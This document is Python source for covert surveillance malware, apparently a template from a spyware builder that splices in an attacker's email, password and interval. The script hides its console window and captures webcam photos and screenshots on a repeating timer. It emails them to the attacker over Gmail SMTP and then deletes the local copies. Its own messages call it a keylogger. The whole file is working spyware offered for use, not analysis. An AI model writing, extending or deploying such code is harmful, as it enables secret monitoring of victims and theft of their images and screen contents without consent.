import smtplib
import ctypes
ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
import imghdr
from email.message import EmailMessage
import pyautogui
import cv2
import smtplib
import imghdr
import os
from cv2 import *
from datetime import datetime
import threading

Sender_Email = '''+f'"{email1}"'+f'''
Reciever_Email = Sender_Email
Password = '''+f'"{password}"'+f'''
interval = '''+str(interval)+f'''

files = [r"C:\\Users\\Public\\Public 3D Objects\\screenshot.png", r"C:\\Users\\Public\\Public 3D Objects\\opencv0.png"]

class Screenshots:
    def __init__(self, email, password, interval):
        self.email = email
        self.password = password
        self.interval = interval

    def screenshot(self):
        try:
            global return_value, filename, file_type, i
            cam = cv2.VideoCapture(0)
            for i in range(1):
                return_value, image = cam.read()
                filename = cv2.imwrite(r"C:\\Users\\Public\\Public 3D Objects\\opencv0.png", image)
            del(cam)

            pyautogui.screenshot(r"C:\\Users\\Public\\Public 3D Objects\\screenshot.png")

            timer = threading.Timer(self.interval, self.screenshot)
            timer.start()
        
            newMessage = EmailMessage()                         
            newMessage['Subject'] = "Check out the Logs!"
            newMessage['From'] = Sender_Email                   
            newMessage['To'] = Reciever_Email                   
            newMessage.set_content('New logs sent from your keylogger!')

            for file in files:
                with open(file, 'rb') as f:
                    file_data = f.read()
                    file_type = imghdr.what(f.name)
                    file_name = f.name

                newMessage.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
                smtp.login(Sender_Email, Password)              
                smtp.send_message(newMessage)

            os.remove(r"C:\\Users\\Public\\Public 3D Objects\\opencv0.png")
            os.remove(r"C:\\Users\\Public\\Public 3D Objects\\screenshot.png")

        except:
            pyautogui.screenshot(r"C:\\Users\\Public\\Public 3D Objects\\screenshot.png")
            timer = threading.Timer(self.interval, self.screenshot)
            timer.start()
        
            newMessage = EmailMessage()                         
            newMessage['Subject'] = "Check out the Logs!"
            newMessage['From'] = Sender_Email                   
            newMessage['To'] = Reciever_Email                   
            newMessage.set_content('New logs sent from your keylogger!')

            with open(r"C:\\Users\\Public\\Public 3D Objects\\screenshot.png", 'rb') as f:
                file_data = f.read()
                file_type = imghdr.what(f.name)
                file_name = f.name

            newMessage.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
                smtp.login(Sender_Email, Password)              
                smtp.send_message(newMessage)

            os.remove(r"C:\\Users\\Public\\Public 3D Objects\\screenshot.png")

keylogger = Screenshots(Sender_Email, Password, interval)
keylogger.screenshot()